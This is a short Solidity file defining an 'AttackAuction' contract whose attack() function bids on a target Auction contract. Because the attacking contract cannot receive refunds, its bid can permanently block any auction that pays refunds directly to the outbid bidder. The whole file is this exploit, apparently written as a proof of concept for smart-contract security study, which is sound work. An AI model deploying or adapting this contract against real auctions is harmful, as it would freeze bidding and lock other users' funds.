// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "./Auction.sol";

contract AttackAuction {
    Auction auction;

    constructor(Auction _auctionaddr) {
        auction = Auction(_auctionaddr);
    }

    function attack() public payable {
        auction.bid{value: msg.value}();
    }
}